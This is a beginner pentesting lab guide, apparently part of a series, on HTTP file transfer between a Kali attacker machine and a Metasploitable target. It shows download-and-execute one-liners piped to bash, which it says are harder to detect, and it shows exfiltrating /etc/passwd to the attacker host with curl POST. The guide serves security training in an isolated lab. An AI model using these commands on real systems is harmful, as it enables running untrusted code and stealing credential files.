# 🌐 HTTP File Transfer — Step-by-Step Guide

> **What is it?** You turn your Kali machine into a mini web server, then the target machine downloads files from it — just like downloading from any website.

> **When to use?** This is the **#1 most common** method in pentesting. Use it whenever the target has `wget` or `curl` (almost every Linux box does).

---

## 📋 What You Need

| Item                  | Details                                  |
| --------------------- | ---------------------------------------- |
| **Kali IP**           | `192.168.56.10` (your attacker machine)  |
| **Metasploitable IP** | `192.168.56.20` (target machine)         |
| **Tools on Kali**     | `python3` (pre-installed)                |
| **Tools on Target**   | `wget` or `curl` (usually pre-installed) |

---

## 🔧 Initial Setup (Do This First!)

### On Kali — Create test files

```bash
# Make a practice folder
mkdir -p ~/Documents/file_transfer_practice
cd ~/Documents/file_transfer_practice

# Create a test file
echo "This is a test file from Kali" > test_file.txt

# Create a test script
echo -e '#!/bin/bash\necho "I was transferred successfully!"' > test_script.sh
chmod +x test_script.sh

# Verify files exist
ls -la
```

---

## 📥 Method 1: Python HTTP Server + wget (Most Common)

### How It Works

```
┌──────────┐    HTTP request     ┌──────────────┐
│   Kali   │ ◄────────────────── │ Metasploitable│
│ (server) │ ────────────────── │   (client)   │
│ port 8080│    file download    │              │
└──────────┘                     └──────────────┘
```

**In simple words**: Kali becomes a web server → Target downloads from it.

### Step 1: Start HTTP server on Kali

```bash
cd ~/Documents/file_transfer_practice
python3 -m http.server 8080
```

> ⚠️ **Keep this terminal open!** The server runs until you press `Ctrl+C`.
>
> You'll see: `Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...`

### Step 2: Open a NEW terminal and SSH into Metasploitable

```bash
# Open a new terminal tab (Ctrl+Shift+T) on Kali
ssh msfadmin@192.168.56.20
# Password: msfadmin
```

### Step 3: Download the file on Metasploitable

```bash
# Download test_file.txt from Kali
wget http://192.168.56.10:8080/test_file.txt
```

### Step 4: Verify the file arrived

```bash
cat test_file.txt
# Should show: "This is a test file from Kali"
```

### What You'll See on Kali's Server Terminal

```
192.168.56.20 - - [03/Mar/2026 23:30:00] "GET /test_file.txt HTTP/1.0" 200 -
```

> This log shows the target successfully downloaded the file.

---

## 📥 Method 2: Python HTTP Server + curl

Same as above, but using `curl` instead of `wget`.

### On Metasploitable (while Kali server is still running)

```bash
# Download and save to file
curl http://192.168.56.10:8080/test_file.txt -o test_file.txt

# Just view the content (don't save)
curl http://192.168.56.10:8080/test_file.txt
```

> **When to use curl vs wget?**
> - Some systems have `wget` but not `curl`, or vice versa
> - `curl` is great for quick viewing without saving
> - `wget` is simpler for just downloading files

---

## 📥 Method 3: Download and Execute in Memory (No File on Disk!)

> **Why?** In real pentesting, you may want to run a script without leaving a file on the target's disk (harder to detect).

### On Metasploitable

```bash
# Using curl — download script and pipe directly to bash
curl http://192.168.56.10:8080/test_script.sh | bash

# Using wget — same thing
wget -qO- http://192.168.56.10:8080/test_script.sh | bash
```

> **What `-qO-` means:**
> - `-q` = quiet (no download progress bar)
> - `-O-` = output to stdout (screen) instead of saving to a file
> - Then `| bash` runs whatever was downloaded

### Expected Output

```
I was transferred successfully!
```

> The script ran but no file was saved on the target!

---

## 📤 Method 4: Upload FROM Target TO Kali (Reverse Direction)

> **Scenario**: You found sensitive files on the target and want to send them back to Kali.

### Step 1: On Kali — start an upload server

```bash
# Save this as upload_server.py first
cat << 'EOF' > upload_server.py
import http.server
import os

class UploadHandler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        data = self.rfile.read(length)
        filename = self.path.strip('/')
        if not filename:
            filename = 'uploaded_file'
        with open(filename, 'wb') as f:
            f.write(data)
        print(f"[+] Received file: {filename} ({length} bytes)")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Upload successful\n")

http.server.HTTPServer(('0.0.0.0', 8080), UploadHandler).serve_forever()
EOF

# Now run it
python3 upload_server.py
```

### Step 2: On Metasploitable — upload a file

```bash
# Upload /etc/passwd to Kali
curl -X POST -d @/etc/passwd http://192.168.56.10:8080/passwd.txt
```

### Step 3: Check on Kali

```bash
# In another terminal, check if the file arrived
cat passwd.txt
```

---

## 📤 Method 5: PHP HTTP Server (Alternative)

> If Python is not available but PHP is:

```bash
# On Kali — start PHP server
cd ~/Documents/file_transfer_practice
php -S 0.0.0.0:8080
```

> Download from target works the same way (wget/curl).

---

## 🧠 Quick Reference Cheatsheet

| What You Want             | Command                                                       |
| ------------------------- | ------------------------------------------------------------- |
| **Start server on Kali**  | `python3 -m http.server 8080`                                 |
| **Download with wget**    | `wget http://KALI_IP:8080/file`                               |
| **Download with curl**    | `curl http://KALI_IP:8080/file -o file`                       |
| **View without saving**   | `curl http://KALI_IP:8080/file`                               |
| **Download + run (curl)** | `curl http://KALI_IP:8080/script.sh \| bash`                  |
| **Download + run (wget)** | `wget -qO- http://KALI_IP:8080/script.sh \| bash`             |
| **Upload from target**    | `curl -X POST -d @/path/to/file http://KALI_IP:8080/filename` |

---

## ❗ Common Mistakes & Fixes

| Problem                  | Fix                                                                       |
| ------------------------ | ------------------------------------------------------------------------- |
| `Connection refused`     | Server not running, or wrong port                                         |
| `No route to host`       | VMs not on same network — check `ifconfig`                                |
| `404 Not Found`          | File doesn't exist in the directory where you started the server          |
| Server exits immediately | You're probably running it in the wrong directory or mistyped the command |

---

## ✅ Practice Checklist

- [ ] Start Python HTTP server on Kali
- [ ] Download file with `wget` on Metasploitable
- [ ] Download file with `curl` on Metasploitable
- [ ] Download and execute a script in memory (no file on disk)
- [ ] Upload a file from Metasploitable back to Kali
- [ ] Check Kali server logs to see download requests

---

> 🔙 **Back to**: [File Transfer Main Guide](./file_transfer.md)
> ➡️ **Next**: [Netcat Transfer](./02_netcat_transfer.md)
